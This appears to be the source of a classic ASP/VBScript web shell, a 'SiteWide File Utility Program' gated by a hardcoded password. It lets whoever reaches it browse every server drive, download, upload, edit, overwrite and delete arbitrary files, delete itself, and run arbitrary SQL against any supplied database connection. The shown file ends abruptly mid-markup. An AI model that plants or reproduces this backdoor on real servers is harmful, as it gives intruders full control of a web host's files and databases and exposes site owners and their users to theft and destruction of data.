<%@Language="VBScript" Codepage=65001%>
<!--METADATA TYPE="TypeLib" UUID="{6B16F98B-015D-417C-9753-74C0404EBC37}" -->
<%

Dim ServerName
Dim FileUpEE_TempPath

Dim oFileUpEE
Dim oFile
Dim intSAResult
Dim oFormItem
Dim oSubItem

ServerName = UCase(request.ServerVariables("SERVER_NAME"))

FileUpEE_TempPath = Server.MapPath("/SW-FileUp_Temp")

Set oFileUpEE = Server.CreateObject("SoftArtisans.FileUpEE")
oFileUpEE.TransferStage = saWebServer             ' Must be set for WebServer as opposed to FileServer
oFileUpEE.DynamicAdjustScriptTimeout(saWebServer) = true
oFileUpEE.TempStorageLocation(saWebServer) = FileUpEE_TempPath

if isblank(request.querystring("cProgressID")) and isblank(request.querystring("wProgressID")) then
  oFileUpEE.ProgressIndicator(saClient)    = false
  oFileUpEE.ProgressIndicator(saWebServer) = false
else  
  oFileUpEE.ProgressIndicator(saClient)    = true
  oFileUpEE.ProgressIndicator(saWebServer) = true
  oFileUpEE.ProgressID(saClient)           = CInt(request.querystring("cProgressID"))
  oFileUpEE.ProgressID(saWebServer)        = CInt(request.querystring("wProgressID"))
end if  

on error resume next
oFileUpEE.ProcessRequest Request, False, False
if err.Number <> 0 then
	response.write "<B>WebServer ProcessRequest Error</B><BR>" & Err.Description & " (" & Err.Source & ")"
	response.end
end if
on error goto 0

oFileUpEE.TargetURL = "http://" & request.ServerVariables("SERVER_NAME") & "/SW-FileUp_Transfer/FileUpEE_FileServer.asp"
oFileUpEE.OverwriteFiles = true

%>
<!--#include virtual="/include/functions_string.asp"-->
<%

' --------------------------------------------------------------------------------------
' FileUpEE Debug
' --------------------------------------------------------------------------------------

Script_Debug = false

if Script_Debug = true then

  with response
  
  	for each oFormItem in oFileUpEE.Form
  		.write oFormItem.Name & ": "
  		if IsObject(oFormItem.Value) then
  			for each oSubItem in oFormItem.Value
  				.write oSubItem.Value & " "
  			next
  		else
  		  .write oFormItem.Value
  		end if
  		.write "<P>"
  	next
    
    for each oFormItem in oFileUpEE.Files
  		.write oFormItem.Name & ": " & oFileUpEE.Files(oFormItem.Name).ClientFileName & "<P>"
    next
      
    .flush
    .end
  
  end with

end if  

' --------------------------------------------------------------------------------------

if request.QueryString("upload")="@" then

  Dim Uploader, File
  Set Uploader = New FileUploader

  ' This starts the upload process
  Uploader.Upload()

  with response
    .write "<HTML>" & vbCrLf
    .write "<TITLE>SiteWide File Utility Program</TITLE>" & vbCrLf
    .write "<STYLE>" & vbCrLf
    .write "<!--" & vbCrLf
    .write "A:link {font-style: text-decoration: none; color: #c8c8c8}" & vbCrLf
    .write "A:visited {font-style: text-decoration: none; color: #777777}" & vbCrLf
    .write "A:active {font-style: text-decoration: none; color: #ff8300}" & vbCrLf
    .write "A:hover {font-style: text-decoration: cursor: hand; color: #ff8300}" & vbCrLf
    .write "*	{scrollbar-base-color:#777777; scrollbar-track-color:#777777;scrollbar-darkshadow-color:#777777;scrollbar-face-color:#505050; scrollbar-arrow-color:#ff8300;scrollbar-shadow-color:#303030;scrollbar-highlight-color:#303030;}" & vbCrLf
    .write "input,select,table {font-family:verdana,arial;font-size:11px;text-decoration:none;border:1px solid #000000;}" & vbCrLf
    .write "//-->" & vbCrLf
    .write "</STYLE>" & vbCrLf
  
    .write "<BODY BGCOLOR=BLACK TEXT=WHITE>" & vbCrLf
  
    .write "<P><BR>" & vbCrLf
    .write "<DIV ALIGN=CENTER>" & vbCrLf
    .write "<TABLE BGCOLOR=""#505050"" CELLPADDING=4>" & vbCrLf
    .write "  <TR>" & vbCrLf
    .write "    <TD><FONT FACE=ARIAL SIZE=-1>File Upload Information:</FONT></TD>" & vbCrLf
    .write "  </TR>" & vbCrLf
    
    .write "  <TR>" & vbCrLf
    .write "    <TD BGCOLOR=BLACK>" & vbCrLf
       
    ' Check if any files were uploaded

    if Uploader.Files.Count = 0 then
    	.write "File(s) not uploaded."
    else
      .write "<TABLE>"
  
    	' Loop through the uploaded files
      	
      for each File in Uploader.Files.Items
    		File.SaveToDisk request.QueryString("txtpath")
     		.write "<TR><TD>&nbsp;</TD></TR>"
        .write "<TR><TD><font color=gray>File Uploaded: </font></TD><TD>" & File.FileName & "</TD></TR>"
    		.write "<TR><TD><font color=gray>Size: </font></TD><TD>" & Int(File.FileSize/1024)+1 & " kb</TD></TR>"
     		.write "<TR><TD><font color=gray>Type: </font></TD><TD>" & File.ContentType & "</TD></TR>"
     	next
      .write "<TR><TD>&nbsp;</TD></TR>"
      .write "</TABLE>"
    end if
  
    .write "    </TD>"
    .write "  </TR>"
    .write "</TABLE>"
    .write "  <BR>"

    .write "<A HREF=""" & request.Servervariables("SCRIPT_NAME") & "?txtpath=" & request.QueryString("txtpath") & """><FONT FACE=""Webdings"" TITLE="" Back "" SIZE=+2 >7</FONT></A>" & vbCrLf
    .write "  </DIV>"
    .write "</BODY>"
    .write "</HTML>"
    
  end with  

  response.end
  
end if

' --------------------------------------------------------------------------------------

on error resume next

response.Buffer = true

password = "password" ' <---Your password here

if request.querystring("logoff") = "@" then
	session("FSPassword")          = "" ' Logged off
	session("dbcon")               = ""	' Database Connection
	session("txtpath")             = ""	' any pathinfo
end if

if (session("FSPassword") <> password) and request.form("code") = "" then

  with response

    .write "<HTML>" & vbCrLf
    .write "<TITLE>SiteWide File Utility Program Login</TITLE>" & vbCrLf
    .write "<STYLE>" & vbCrLf
    .write "<!--" & vbCrLf
    .write "A:link {font-style: text-decoration: none; color: #c8c8c8}" & vbCrLf
    .write "A:visited {font-style: text-decoration: none; color: #777777}" & vbCrLf
    .write "A:active {font-style: text-decoration: none; color: #ff8300}" & vbCrLf
    .write "A:hover {font-style: text-decoration: cursor: hand; color: #ff8300}" & vbCrLf
    .write "*	{scrollbar-base-color:#777777; scrollbar-track-color:#777777;scrollbar-darkshadow-color:#777777;scrollbar-face-color:#505050; scrollbar-arrow-color:#ff8300;scrollbar-shadow-color:#303030;scrollbar-highlight-color:#303030;}" & vbCrLf
    .write "input,select,table {font-family:verdana,arial;font-size:11px;text-decoration:none;border:1px solid #000000;}" & vbCrLf
    .write "//-->" & vbCrLf
    .write "</STYLE>" & vbCrLf


    .write "<BODY BGCOLOR=BLACK>" & vbCrLf
    .write "<DIV ALIGN=CENTER>" & vbCrLf
    .write "<BR><BR><BR><BR>" & vbCrLf
    .write "<FONT FACE=ARIAL SIZE=-2 COLOR=#FF8300>Administrator's Logon</FONT>" & vbCrLf
    .write "<BR><BR><BR>" & vbCrLf
    
    .write "<TABLE>" & vbCrLf
    .write "  <TR>" & vbCrLf
    .write "    <TD>" & vbCrLf
    .write "      <FORM METHOD=""POST"" ACTION=""" & request.Servervariables("SCRIPT_NAME") & """>" & vbCrLf
    .write "      <TABLE BGCOLOR=#505050 WIDTH=""20%"" CELLPADDING=20>" & vbCrLf
    .write "        <TR>" & vbCrLf
    .write "          <TD BGCOLOR=#303030 ALIGN=CENTER>" & vbCrLf
    .write "            <INPUT TYPE=Password NAME=Code >" & vbCrLf
    .write "          </TD>" & vbCrLf
    .write "          <TD>" & vbCrLf
    .write "            <INPUT NAME=SUBMIT TYPE=SUBMIT VALUE="" Access "">" & vbCrLf
    .write "          </TD>" & vbCrLf
    .write "        </TR>" & vbCrLf
    .write "      </TABLE>" & vbCrLf
    .write "    </TD>" & vbCrLf
    .write "  </TR>" & vbCrLf
    .write "  <TR>" & vbCrLf
    .write "    <TD ALIGN=RIGHT>" & vbCrLf
    .write "      <FONT COLOR=WHITE SIZE=-2 FACE=ARIAL >SiteWide File Utility Program</FONT>" & vbCrLf
    .write "    </TD>" & vbCrLf
    .write "  </TR>" & vbCrLf
    .write "</TABLE>" & vbCrLf
    .write "</FORM>" & vbCrLf
    
  if request.querystring("logoff") = "@" then
    .write "<FONT COLOR=GRAY SIZE=-2 FACE=ARIAL>"
    .write "<SPAN STYLE='CURSOR: HAND;' ONCLICK=WINDOW.CLOSE(THIS);>Close Window"
    .write "</FONT>"
  end if
  
    .write "</DIV>"

		.end
    
  end with

end if

' --------------------------------------------------------------------------------------

if request.form("code") = password or session("FSPassword") = password then
  session("FSPassword") = password
else
  response.write "<BR><B><P align=center><font color=white ><b>Access Denied</B></font><BR><font color=Gray >Copyright 2003 Vela iNC.</font></p>"
	response.end
end if

server.scriptTimeout = 180
set fso    = Server.CreateObject("Scripting.FileSystemObject")
mapPath    = Server.mappath(request.Servervariables("SCRIPT_NAME"))
mapPathLen = len(mapPath)

if session(myScriptName) = "" then
	for x = mapPathLen to 0 step -1
	  myScriptName = mid(mapPath,x)
  	if instr(1,myScriptName,"\")>0 then
	  	myScriptName = mid(mapPath,x+1)
		  x=0
  		session(myScriptName) = myScriptName
	  end if
	next
else
	myScriptName = session(myScriptName)
end if

wwwRoot = left(mapPath, mapPathLen - len(myScriptName))
Target = wwwRoot & "..\SW-FileUp_Transfer\"  ' ---Directory to which files will be DUMPED To and From

if len(request.querystring("txtpath")) = 3 then
  pathname = left(request.querystring("txtpath"),2) & "\" & request.form("Fname")
else
  pathname = request.querystring("txtpath") & "\" & request.form("Fname")
end if

if request.Form("txtpath") = "" then
	MyPath = request.QueryString("txtpath")
else
	MyPath = request.Form("txtpath")
end if

' Path Correction Routine

if len(MyPath) = 1  then MyPath=MyPath & ":\"
if len(MyPath) = 2  then MyPath=MyPath & "\"
if MyPath      = "" then MyPath = wwwRoot

if not fso.FolderExists(MyPath) then
	response.write "<font face=arial size=+2 color=""White"">Non-existing path specified.<BR>Please use browser back button to continue !"
	response.end
end if

set folder = fso.GetFolder(MyPath)

if fso.GetFolder(Target) = false then
	response.write "<font face=arial size=-2 color=White>Temporary Target Directory does not exist. </font><font face=arial size=-1 color=White>" & Target & "<BR></font>"
else
	set fileCopy = fso.GetFolder(Target)
end if

if Not(folder.IsRootFolder) then
  if len(folder.ParentFolder) > 3 then
  	showPath = folder.ParentFolder & "\" & folder.name
  else
	  showPath = folder.ParentFolder & folder.name
  end if
else
  showPath = left(MyPath,2)
end if

MyPath   = showPath
showPath = MyPath & "\"

' ---Path Correction Routine End

set drv = fso.GetDrive(left(MyPath,2))

if request.Form("cmd") = "Download" then

  if request.Form("Fname") <> "" then
  
	  response.Buffer = True
  	response.Clear
	  strFileName = request.QueryString("txtpath") & "\" & request.Form("Fname")
  	Set Sys = Server.CreateObject( "Scripting.FileSystemObject" )
	  Set Bin = Sys.OpenTextFile( strFileName, 1, False )
  	Call response.AddHeader( "Content-Disposition", "attachment; filename=" & request.Form("Fname") )
	  response.ContentType = "application/octet-stream"
	  while Not Bin.AtEndOfStream
		  response.BinaryWrite( ChrB( Asc( Bin.Read( 1 ) ) ) )
	  wend
  	Bin.Close : Set Bin = Nothing
    Set Sys = Nothing
  else
 	  err.number = 500
  	err.description = "Nothing selected for download."
  end if
  
end if
%>

<HTML>
<STYLE>
<!--
A:link {font-style: text-decoration: none; color: #c8c8c8}
A:visited {font-style: text-decoration: none; color: #777777}
A:active {font-style: text-decoration: none; color: #ff8300}
A:hover {font-style: text-decoration: cursor: hand; color: #ff8300}
*		{scrollbar-base-color:#777777;
scrollbar-track-color:#777777;scrollbar-darkshadow-color:#777777;scrollbar-face-color:#505050;
scrollbar-arrow-color:#ff8300;scrollbar-shadow-color:#303030;scrollbar-highlight-color:#303030;}
input,select,table {font-family:verdana,arial;font-size:11px;text-decoration:none;border:1px solid #000000;}
//-->
</STYLE>
<%

' Query Analyser Begin

if request.QueryString("qa") = "@" then

  ' --------------------------------------------------------------------------------------
  
  sub getTable(mySQL)
  
    if mySQL="" then
  	  exit sub
  	end if
  	
    on error resume next
  	
    response.Buffer = True
    
    Dim myDBConnection, rs, myHtml,myConnectionString, myFields,myTitle,myFlag
  	
    myConnectionString=session("dbCon")
    Set myDBConnection = Server.CreateObject("ADODB.Connection")
    myDBConnection.Open myConnectionString
  	myFlag = False
  	myFlag = errChk()
    set rs = Server.CreateObject("ADODB.Recordset")
  	rs.cursorlocation = 3
  	rs.open mySQL, myDBConnection
  	myFlag = errChk()
  
  	if RS.properties("Asynchronous Rowset Processing") = 16 then
    
      for i = 0 to rs.Fields.Count - 1
    		myFields = myFields & "<TD><font color=#eeeeee size=2 face=""Verdana, Arial, Helvetica, sans-serif"">" & rs.Fields(i).Name & "</font></TD>"
    	next
  		myTitle = "<font color=gray size=6 face=webdings>è</font><font color=#ff8300 size=2 face=""Verdana, Arial, Helvetica, sans-serif"">Query results :</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color=gray><TT>(" & rs.RecordCount & " row(s) affected)</TT><br>"
  		
      rs.MoveFirst
  		rs.PageSize = mNR
  		
      if int(rs.RecordCount/mNR) < mPage then mPage=1
      
      rs.AbsolutePage = mPage
  		response.write myTitle & "</TD><TD>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"
      
      if mPage = 1 then response.write("<input type=button name=btnPagePrev value=""  <<  "" DISABLED>") else response.write("<input type=button name=btnPagePrev value=""  <<  "">")
      
      response.write "<select name=cmbPageSelect>"
      for x = 1 to rs.PageCount
  	    if x = mPage then response.write("<option value=" & x & " SELECTED>" & x & "</option>") else response.write("<option value=" & x & ">" & x & "</option>")
      next
  
      response.write "</select><input type=hidden name=mPage value=" & mPage & ">"
      
      if mPage = rs.PageCount then response.write("<input type=button name=btnPageNext value=""  >>  "" DISABLED>") else response.write("<input type=button name=btnPageNext value=""  >>  "">")
      response.write "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color=gray>Displaying <input type=text size=" & Len(mNR) & " name=txtNoRecords value=" & mNR & "> records at a time.</font>"
  		response.write "</TD><TABLE border=0 bgcolor=#999999 cellpadding=2><TR align=center valign=middle bgcolor=#777777>" & myFields
  
      for x = 1 to rs.PageSize
        if Not rs.EOF then
       response.write "<TR>"
    			for i = 0 to rs.Fields.Count - 1
        response.write "<TD bgcolor=#dddddd>" & server.HTMLEncode(rs(i)) & "</TD>"
       next
       response.write "</TR>"
       response.flush
    			rs.MoveNext
      else
  	    x = rs.PageSize
  		  end if
  		Next
  		
      response.write "</Table>"
  		myFlag = errChk()
  
  	else
    
  		if not myFlag then
  			myTitle = "<font color=#55ff55 size=6 face=webdings>i</font><font color=#ff8300 size=2 face=""Verdana, Arial, Helvetica, sans-serif"">Query results :</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color=gray><TT>(The command(s) completed successfully.)</TT><br>"
  			response.write myTitle
  		end if
  	
    end if
  	
    set myDBConnection = nothing
    set rs2 = nothing
    set rs = nothing
      
  end sub
  
  ' --------------------------------------------------------------------------------------
  
  sub getXML(mySQL)
  
    if mySQL = "" then
    	exit sub
  	end if
  	
    on error resume next
  	
    response.Buffer = True
    
    Dim myDBConnection, rs, myHtml,myConnectionString, myFields,myTitle,myFlag
  	myConnectionString = session("dbCon")
    Set myDBConnection = Server.CreateObject("ADODB.Connection")
   	myDBConnection.Open myConnectionString
  	myFlag = False
  	myFlag = errChk()
   	set rs = Server.CreateObject("ADODB.Recordset")
  	rs.cursorlocation = 3
   	rs.open mySQL, myDBConnection
  	myFlag = errChk()
  
  	if RS.properties("Asynchronous Rowset Processing") = 16 then
  		response.write "<font color=#55ff55 size=4 face=webdings>i</font><font color=#cccccc> Copy paste this code and save as '.xml '</font></TD></TR><TR><TD>"
  		response.write "<textarea cols=75 name=txtXML rows=15>"
  		rs.MoveFirst
  		response.write vbcrlf & "<?xml version=""1.0"" ?>"
  		response.write vbcrlf & "<TableXML>"
  
  		do while not rs.EOF
  			response.write vbcrlf & "<Column>"
  			for i = 0 to rs.Fields.Count - 1
  				response.write  vbcrlf & "<" & rs.Fields(i).Name & ">"  & rs(i) & "</" & rs.Fields(i).Name & ">" & vbcrlf
  				response.Flush()
  			next
  			response.write "</Column>"
  		  rs.MoveNext
  		loop
      
  		response.write "</TableXML>"
  		response.write "</textarea>"	
  		myFlag = errChk()
  
  	else
  		if not myFlag then
  			myTitle = "<font color=#55ff55 size=6 face=webdings>i</font><font color=#ff8300 size=2 face=""Verdana, Arial, Helvetica, sans-serif"">Query results :</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color=gray><TT>(The command(s) completed successfully.)</TT><br>"
  			response.write myTitle
  		end if
  	end if
    
  end sub
  
  ' --------------------------------------------------------------------------------------
  
  function errChk()
  
  	if err.Number <> 0 and err.Number <> 13 then
  		dim myText
  		myText = "<font color=#ff8300 size=4 face=webdings>x</font><font color=white size=2 face=""Verdana, Arial, Helvetica, sans-serif""> " & err.Description & "</font><BR>"
  		response.write myText
  		err.Number = 0
  		errChk = True
  	end if
  
  end Function
  
  ' --------------------------------------------------------------------------------------
  
  Dim myQuery, mPage, mNR
  myQuery = request.Form("txtSQL")
  
  if request.form("txtCon") <> "" then session("dbcon") = request.form("txtCon")
  if request.QueryString("txtpath") then session("txtpath")=request.QueryString("txtpath")
  
  mPage = CInt(request.Form("mPage"))
  if mPage < 1 then mPage = 1
  mNR = CInt(request.Form("txtNoRecords"))
  if mNR < 1 then mNR = 30
  %>
  
  <HTML><TITLE>Query Analyser</TITLE>
  
  <SCRIPT LANGUAGE="VbScript">
  <!--
  
  sub cmdSubmit_onclick
  	if Document.frmSQL.txtSQL.value = "" then
  		Document.frmSQL.txtSQL.value = "SELECT * FROM " & vbcrlf & "WHERE " & vbcrlf & "ORDER BY "
  		exit sub
  	end if
  	Document.frmSQL.Submit
  end sub
  
  sub cmdTables_onclick
  	Document.frmSQL.txtSQL.value = "select name as 'TablesListed' from sysobjects where xtype='U' order by name"
  	Document.frmSQL.Submit
  end sub
  
  sub cmdColumns_onclick
  	strTable =InputBox("Return Columns for which Table?","Table Name...")
  	strTable = Trim(strTable)
  	if len(strTable) > 0 Then
  		SQL = "select name As 'ColumnName',xusertype As 'DataType',length as Length from syscolumns where id=(select id from sysobjects where xtype='U' and name='" & strTable & "') order by name"
  		Document.frmSQL.txtSQL.value = SQL
  		Document.frmSQL.Submit	
  	end if
  end sub
  
  sub cmdClear_onclick
  	Document.frmSQL.txtSQL.value = ""
  end sub
  
  sub cmdBack_onclick
  	Document.Location = "<%=request.Servervariables("SCRIPT_NAME")%>?txtpath=<%=session("txtpath")%>"
  end sub
  
  sub btnPagePrev_OnClick
  	Document.frmSQL.mPage.value = Document.frmSQL.mPage.value - 1
  	Document.frmSQL.Submit
  end sub
  
  sub btnPageNext_OnClick
  	Document.frmSQL.mPage.value = Document.frmSQL.mPage.value + 1
  	Document.frmSQL.Submit
  end sub
  
  sub cmbPageSelect_onchange
  	Document.frmSQL.mPage.value = (Document.frmSQL.cmbPageSelect.selectedIndex + 1)
  	Document.frmSQL.Submit
  end Sub
  
  sub txtNoRecords_onclick
  	Document.frmSQL.cmbPageSelect.selectedIndex = 0
  	Document.frmSQL.mPage.value = 1
  End Sub
  //-->
  </SCRIPT>
  
  <STYLE>
  	TR {font-family: sans-serif;}
  </STYLE>
  <BODY BGCOLOR=BLACK>
  <FORM NAME=FRMSQL ACTION="<%=request.Servervariables("SCRIPT_NAME")%>?qa=@" method=Post>
  <TABLE BORDER="0">
    <TR>
      <TD ALIGN=RIGHT><FONT COLOR=#FF8300 SIZE="4" FACE="webdings">@ </FONT><FONT COLOR="#CCCCCC" SIZE="1" FACE="Verdana, Arial, Helvetica, sans-serif">Paste 
        your connection string here : </FONT><FONT COLOR="#CCCCCC"> 
        <INPUT NAME=TXTCON TYPE="text" SIZE="60" VALUE="<%=session("DBCON")%>">
        </FONT>
        <BR>
        <TEXTAREA COLS=75 NAME=TXTSQL ROWS=4 WRAP=PHYSICAL><%=myQuery%></TEXTAREA><BR>
        <INPUT NAME=CMDSUBMIT TYPE=BUTTON VALUE=SUBMIT><INPUT NAME=CMDTABLES TYPE=BUTTON VALUE=TABLES><INPUT NAME=CMDCOLUMNS TYPE=BUTTON VALUE=COLUMNS><INPUT NAME="reset" TYPE=RESET VALUE=RESET><INPUT NAME=CMDCLEAR TYPE=BUTTON VALUE=CLEAR><INPUT NAME=CMDBACK TYPE=BUTTON VALUE="Return"><INPUT TYPE="Checkbox" NAME="chkXML" <%IF request.FORM("chkXML")= "on" then response.write " checked " %>><FONT COLOR="#CCCCCC" SIZE="1" FACE="Verdana, Arial, Helvetica, sans-serif">GenerateXML</FONT>
      </TD>
  	  <TD>XXXXXX</TD>
      <TD>
      	<B>SiteWide File Utility Program</B><FONT COLOR=#FF8300 FACE=WEBDINGS SIZE=6 >!</FONT><B><FONT COLOR=GRAY >Spider</FONT></B>
  	  </TD>
    </TR>
  </TABLE>
  <TABLE>
    <TR>
      <TD>
        <%If request.Form("chkXML") = "on"  then getXML(myQuery) Else getTable(myQuery) %>
      </TD>
    </TR>
  </TABLE>
  </FORM>
  </BODY>
  </HTML>
  
  <%
  set myDBConnection = nothing
  set rs2 = nothing
  set rs = nothing
  
  response.end
  
end if

' --------------------------------------------------------------------------------------
' Query Analyser End
' --------------------------------------------------------------------------------------
%>

<TITLE><%=MyPath%></TITLE>
</HEAD>
<BODY BGCOLOR=BLACK TEXT=WHITE TOPAPRGIN="0">

<%
response.Flush

' Code Optimization Begin
  
select case request.form("cmd")
	case ""                 ' No Command
  
		if request.form("dirStuff") <> "" then
			response.write "<font face=arial size=-2>You need to click [Create] or [Delete] for folder operations to be</font>"
		else
			response.write "<font face=webdings size=+3 color=#ff8300>¬</font>"
		end if
    
	case "   Copy   "     	' Copy FROM Folder
  
		if request.Form("Fname") = "" then
  		response.write "<font face=arial size=-2 color=#ff8300>Copying: " & request.QueryString("txtpath") & "\???</font><BR>"
			err.number = 424
		else
			response.write "<font face=arial size=-2 color=#ff8300>Copying: " & request.QueryString("txtpath") & "\" & request.Form("Fname") & "</font><BR>"
			fso.CopyFile request.QueryString("txtpath") & "\" & request.Form("Fname"),Target & request.Form("Fname")
			response.Flush
		end if

	case "  Copy "          ' Copy TO Folder
  
		if request.Form("ToCopy") <> "" and request.Form("ToCopy") <> "------------------------------" then
			response.write "<font face=arial size=-2 color=#ff8300>Copying: " & request.Form("txtpath") & "\" & request.Form("ToCopy") & "</font><BR>"
			response.Flush
			fso.CopyFile Target & request.Form("ToCopy"), request.Form("txtpath") & "\" & request.Form("ToCopy")
		else
		  response.write "<font face=arial size=-2 color=#ff8300>Copying: " & request.Form("txtpath") & "\???</font><BR>"
			err.number=424
		end if
    
	case "Delete"
  
  	if request.form("todelete") <> "" then  ' Delete File

	  	if (request.Form("ToDelete")) = myScriptName then     '(Right(request.Servervariables("SCRIPT_NAME"),len(request.Servervariables("SCRIPT_NAME"))-1)) Then
    		response.write "<center><font face=arial size=-2 color=#ff8300><BR><BR><HR>SELFDESTRUCT INITIATED...<BR>"
		  	response.flush
			  fso.DeleteFile request.Form("txtpath") & "\" & request.Form("ToDelete")
				%>
        +++DONE+++
        </FONT>
        <P>
				<FONT COLOR=GRAY SIZE=-2 FACE=ARIAL><SPAN STYLE='CURSOR: HAND;' ONCLICK=WINDOW.CLOSE(THIS);>Close Window</FONT>
			  <%
        response.End
	  	end if
    
  		if request.Form("ToDelete") <> "" and request.Form("ToDelete") <> "------------------------------" then
  			response.write "<font face=arial size=-2 color=#ff8300>Deleting: " & request.Form("txtpath") & "\" & request.Form("ToDelete") & "</font><BR>"
  			response.flush
  			fso.DeleteFile request.Form("txtpath") & "\" & request.Form("ToDelete")
  		else
  			response.write "<font face=arial size=-2 color=#ff8300>Deleting: " & request.Form("txtpath") & "\???</font><BR>"
  			err.number = 424
  		end if

		else
      if request.form("dirStuff") <> "" then  ' Delete Folder
  			response.write "<font face=arial size=-2 color=#ff8300>Deleting folder...</font><BR>"
	  		fso.DeleteFolder MyPath & "\" & request.form("DirName")
		  end if
	  end if

  case "Edit/Create"
    %>
    <CENTER>
    <BR>
    <TABLE BGCOLOR="#505050" CELLPADDING="8">
      <TR>
        <TD BGCOLOR="#000000" VALIGN="bottom">
    	    <FONT FACE=ARIAL SIZE=-2 COLOR=#FF8300>NOTE: The following edit box maynot display special characters from files. Therefore the contents displayed maynot be considered correct or accurate.</FONT>
    	  </TD>
      </TR>
      <TR>
        <TD><TT>Path=> <%=pathname%><BR><BR>
      <%
      
  	' Fetch file information 
    Set f = fso.GetFile(pathname) 

    %>
    file Type: <%=f.Type%><BR>
    file Size: <%=FormatNumber(f.size,0)%> bytes<BR>
    file Created: <%=FormatDateTime(f.datecreated,1)%>&nbsp;<%=FormatDateTime(f.datecreated,3)%><BR>
    last Modified: <%=FormatDateTime(f.datelastmodified,1)%>&nbsp;<%=FormatDateTime(f.datelastmodified,3)%><BR>
    last Accessed: <%=FormatDateTime(f.datelastaccessed,1)%>&nbsp;<%=FormatDateTime(f.datelastaccessed,3)%><BR>
    file Attributes: <%=f.attributes%><BR>
    <%
    
  	Set f = Nothing
  	response.write "<center><FORM action=""" & request.Servervariables("SCRIPT_NAME") & "?txtpath=" & MyPath & """ METHOD=""POST"">"

    ' Read the file
    
		Set f = fso.OpenTextFile(pathname)
		if not f.AtEndOfStream then fstr = f.readall
		f.Close
		Set f   = Nothing
		Set fso = Nothing
    
		response.write "<TABLE><TR><TD>" & VBCRLF
		response.write "<FONT TITLE=""Use this text area to view or change the contents of this document. Click [Save As] to store the updated contents to the web server."" FACE=arial SIZE=1 ><B>Document Comments</B></FONT><BR>" & VBCRLF
		response.write "<TEXTAREA NAME=FILEDATA ROWS=16 COLS=85 WRAP=OFF>" & Server.HTMLEncode(fstr) & "</TEXTAREA>" & VBCRLF
		response.write "</TD></TR></TABLE>" & VBCRLF
    %>

      <BR>
      <CENTER>
      <TT>LOCATION <INPUT TYPE="TEXT" SIZE=48 MAXLENGTH=255 NAME="PATHNAME" VALUE="<%=pathname%>">
      <INPUT TYPE="SUBMIT" NAME=CMD VALUE="Save As" TITLE="This write to the file specifed and overwrite it without warning.">
      <INPUT TYPE="SUBMIT" NAME="POSTACTION" VALUE="Cancel" TITLE="If you recieve an error while saving, then most likely you do not have write access OR the file attributes are set to ReadOnly.">
      </FORM>
        </TD>
      </TR>
    </TABLE>
    <BR>
    <%
    response.end

	case "Create"
  
		response.write "<font face=arial size=-2 color=#ff8300>Creating folder...</font><BR>"
		fso.CreateFolder MyPath & "\" & request.form("DirName")

	case "Save As"

		response.write "<font face=arial size=-2 color=#ff8300>Saving file...</font><BR>"
		Set f = fso.CreateTextFile(request.Form("pathname"))
		f.write request.Form("FILEDATA")
		f.close

end select

' Drives

if request.querystring("getDRVs")="@" then
%>
<BR><BR><BR><CENTER><TABLE BGCOLOR="#505050" CELLPADDING=4>
<TR><TD><FONT FACE=ARIAL SIZE=-1>Available Drive Information:</FONT>
</TD></TR><TR><TD BGCOLOR=BLACK >
<TABLE><TR><TD><TT>Drive</TD><TD><TT>Type</TD><TD><TT>Path</TD><TD><TT>ShareName</TD><TD><TT>Size[MB]</TD><TD><TT>ReadyToUse</TD><TD><TT>VolumeLabel</TD><TD></TR>
<%For Each thingy in fso.Drives%>
<TR><TD><TT>
<%=thingy.DriveLetter%> </TD><TD><TT> <%=thingy.DriveType%> </TD><TD><TT> <%=thingy.Path%> </TD><TD><TT> <%=thingy.ShareName%> </TD><TD><TT> <%=((thingy.TotalSize)/1024000)%> </TD><TD><TT> <%=thingy.IsReady%> </TD><TD><TT> <%=thingy.VolumeName%>
<%Next%>
</TD></TR></TABLE>
</TD></TR></TABLE><BR><A HREF="<%=request.Servervariables("SCRIPT_NAME")%>?txtpath=<%=MyPath%>"><FONT FACE="webdings" TITLE=" BACK " SIZE=+2 >7</FONT></A></CENTER>
<%
	response.end
	end if
' ---DRIVES stop here
%>
<HEAD>
<SCRIPT LANGUAGE="VBScript">
sub getit(thestuff)
if right("<%=showPath%>",1) <> "\" Then
   document.myform.txtpath.value = "<%=showPath%>" & "\" & thestuff
Else
   document.myform.txtpath.value = "<%=showPath%>" & thestuff
end if
document.myform.submit()
End sub
</SCRIPT>
</HEAD>
<%	
'---Report errors
select case err.number
	case "0"
	response.write "<font face=webdings color=#55ff55>i</font> <font face=arial size=-2>Successful.</font>"

	case "58"
	response.write "<font face=arial size=-1 color=white>Folder already exists OR no folder name specified.</font>"

	case "70"
	response.write "<font face=arial size=-1 color=white>Permission Denied, folder/file is ReadOnly or contains files.</font>"

	case "76"
	response.write "<font face=arial size=-1 color=white>Path not found.</font>"

	case "424"
	response.write "<font face=arial size=-1 color=white>Missing, Insufficient data OR file is ReadOnly.</font>"
	
	case else
	response.write "<font face=arial size=-1 color=white>" & err.description & "</font>"

end select
'---Report errors end
%>
<P>
<B>SiteWide File Utility Program</B><FONT COLOR=#FF8300 FACE=WEBDINGS SIZE=6 >!</FONT><B><FONT COLOR=GRAY >Spider</FONT></B>
<FONT FACE=COURIER>
<TABLE><TR><TD>
<FORM METHOD="post" ACTION="<%=request.Servervariables("SCRIPT_NAME")%>" name="myform" >
<TABLE BGCOLOR=#505050 >
<TR>
<TD BGCOLOR=#505050 ><FONT FACE=ARIAL SIZE=-2 COLOR=#FF8300 > PATH INFO : </FONT></TD>
<TD ALIGN=RIGHT ><FONT FACE=ARIAL SIZE=-2 COLOR=#FF8300 >Volume Label:</FONT> <%=drv.VolumeName%> </TD>
</TR>
<TR>
<TD COLSPAN=2 CELLPADDING=2 BGCOLOR=#303030 >
<FONT FACE=ARIAL SIZE=-1 COLOR=GRAY>Virtual: http://<%=request.ServerVariables("SERVER_NAME")%><%=request.Servervariables("SCRIPT_NAME")%></FONT><BR><FONT FACE=WINGDINGS COLOR=GRAY >1</FONT><FONT FACE=ARIAL SIZE=+1 > <%=showPath%></FONT>
<BR>
<INPUT TYPE=TEXT WIDTH=40 SIZE=60 NAME=TXTPATH VALUE="<%=showPath%>" >
<INPUT TYPE=SUBMIT NAME=CMD VALUE="  View  " >
</TD>
</TR>
</FORM>
</TABLE>
</TD>
